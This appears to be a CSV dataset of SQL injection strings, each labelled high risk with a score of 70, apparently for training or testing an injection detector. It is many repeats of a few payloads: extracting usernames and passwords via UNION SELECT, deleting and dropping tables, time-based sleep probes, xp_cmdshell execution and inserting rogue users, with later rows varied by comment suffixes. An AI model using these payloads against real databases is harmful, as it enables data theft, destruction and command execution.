query,risk,score
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DROP PROCEDURE admin_login--,high,70
'; DROP PROCEDURE admin_login--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' UNION ALL SELECT username, password FROM users",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; DELETE FROM users; /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DROP PROCEDURE admin_login--,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
' OR SLEEP(5) AND '1'='1,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; SELECT pg_sleep(5); --,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"' UNION ALL SELECT username, password FROM users",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; SELECT pg_sleep(5); --,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR SLEEP(5) AND '1'='1,high,70
"' UNION ALL SELECT username, password FROM users",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; DROP PROCEDURE admin_login--,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DELETE FROM users; /**/,high,70
'; SELECT pg_sleep(5); --,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DELETE FROM users; /**/,high,70
'; SELECT pg_sleep(5); --,high,70
'; DROP PROCEDURE admin_login--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; DROP PROCEDURE admin_login--,high,70
'; DROP PROCEDURE admin_login--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR SLEEP(5) AND '1'='1,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
' OR SLEEP(5) AND '1'='1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; WAITFOR DELAY '0:0:5'--,high,70
' OR SLEEP(5) AND '1'='1,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; SELECT pg_sleep(5); --,high,70
'; DELETE FROM users; /**/,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; DROP PROCEDURE admin_login--,high,70
' OR SLEEP(5) AND '1'='1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; SELECT pg_sleep(5); --,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; DROP PROCEDURE admin_login--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; DROP PROCEDURE admin_login--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR SLEEP(5) AND '1'='1,high,70
'; DROP PROCEDURE admin_login--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; DROP PROCEDURE admin_login--,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DROP PROCEDURE admin_login--,high,70
'; DELETE FROM users; /**/,high,70
'; DROP PROCEDURE admin_login--,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; WAITFOR DELAY '0:0:5'--,high,70
'; DELETE FROM users; /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
"' UNION ALL SELECT username, password FROM users",high,70
' OR 1=1; DROP TABLE temp; --,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; SELECT pg_sleep(5); --,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DELETE FROM users; /**/,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DROP PROCEDURE admin_login--,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; DELETE FROM users; /**/,high,70
'; DROP PROCEDURE admin_login--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
'; ALTER TABLE users ADD column VARCHAR(255),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
' OR SLEEP(5) AND '1'='1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; SELECT pg_sleep(5); --,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
' OR SLEEP(5) AND '1'='1,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; SELECT pg_sleep(5); --,high,70
' OR SLEEP(5) AND '1'='1,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DELETE FROM users; /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
'; SELECT pg_sleep(5); --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
' OR SLEEP(5) AND '1'='1,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; DROP TABLE temp; --,high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
"' UNION ALL SELECT username, password FROM users",high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; DELETE FROM users; /**/,high,70
'; DROP PROCEDURE admin_login--,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; DROP PROCEDURE admin_login--,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
'; WAITFOR DELAY '0:0:5'--,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; DROP PROCEDURE admin_login--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
'; SELECT pg_sleep(5); --,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"'; EXEC sp_configure 'show advanced options', 1; --",high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR SLEEP(5) AND '1'='1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"' UNION ALL SELECT username, password FROM users",high,70
'; DROP PROCEDURE admin_login--,high,70
'; SELECT pg_sleep(5); --,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables --",high,70
' OR 1=1; INSERT INTO logs VALUES('hack'),high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
' OR SLEEP(5) AND '1'='1,high,70
"'; INSERT INTO users VALUES ('hack', 'hack')",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) --",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--,high,70
' OR 1=1; DROP TABLE temp; --,high,70
'; SELECT pg_sleep(5); --,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # r,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 6,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR 1=1; DROP TABLE temp; -- # 8,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' UNION ALL SELECT username, password FROM users # k",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 5",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # x,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # w,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # s,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 7,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # g",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # f",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 9",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # p,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # o,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 7,high,70
' OR SLEEP(5) AND '1'='1 # 4,high,70
"' UNION ALL SELECT username, password FROM users # a",high,70
'; SELECT pg_sleep(5); -- # o,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR SLEEP(5) AND '1'='1 # m,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DROP PROCEDURE admin_login-- # g,high,70
' OR SLEEP(5) AND '1'='1 # 7,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DROP PROCEDURE admin_login-- # g,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # f,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # n",high,70
'; DELETE FROM users; /**/ # z,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # c",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # v",high,70
' OR SLEEP(5) AND '1'='1 # q,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # v,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DROP PROCEDURE admin_login-- # r,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; SELECT pg_sleep(5); -- # m,high,70
' OR 1=1; DROP TABLE temp; -- # q,high,70
'; SELECT pg_sleep(5); -- # 5,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; DELETE FROM users; /**/ # k,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # n,high,70
'; DELETE FROM users; /**/ # 1,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # d,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # u,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # k",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR SLEEP(5) AND '1'='1 # t,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # q,high,70
' OR SLEEP(5) AND '1'='1 # s,high,70
' OR SLEEP(5) AND '1'='1 # m,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DROP PROCEDURE admin_login-- # u,high,70
"' UNION ALL SELECT username, password FROM users # i",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # m,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; SELECT pg_sleep(5); -- # x,high,70
'; DELETE FROM users; /**/ # 9,high,70
'; DELETE FROM users; /**/ -- ,high,70
'; DELETE FROM users; /**/ # f,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # p",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR SLEEP(5) AND '1'='1 # 9,high,70
'; WAITFOR DELAY '0:0:5'-- # i,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DELETE FROM users; /**/ # d,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; SELECT pg_sleep(5); -- # r,high,70
'; SELECT pg_sleep(5); -- # 0,high,70
' OR 1=1; DROP TABLE temp; -- # r,high,70
'; DELETE FROM users; /**/ # 0,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 7",high,70
' OR SLEEP(5) AND '1'='1 # 4,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # i",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DROP PROCEDURE admin_login-- # 0,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 4",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 2",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # x,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 2",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 0,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DELETE FROM users; /**/ # a,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # e,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # n,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # f",high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # e",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
' OR SLEEP(5) AND '1'='1 # u,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # y,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # b,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # x",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DELETE FROM users; /**/ # b,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR SLEEP(5) AND '1'='1 # a,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 6",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; WAITFOR DELAY '0:0:5'-- # 4,high,70
'; DROP PROCEDURE admin_login-- # q,high,70
' OR SLEEP(5) AND '1'='1 # a,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # e,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' UNION ALL SELECT username, password FROM users # y",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 6",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; SELECT pg_sleep(5); -- # y,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 6",high,70
'; SELECT pg_sleep(5); -- # b,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # u,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR SLEEP(5) AND '1'='1 # u,high,70
' OR 1=1; DROP TABLE temp; -- # 7,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # z",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # r,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; SELECT pg_sleep(5); -- # 0,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # b",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # i",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 5",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; DELETE FROM users; /**/ # e,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR SLEEP(5) AND '1'='1 # f,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- # f,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # l,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # q,high,70
' OR SLEEP(5) AND '1'='1 # z,high,70
'; DROP PROCEDURE admin_login-- # u,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- # o,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # g,high,70
'; WAITFOR DELAY '0:0:5'-- # x,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 8",high,70
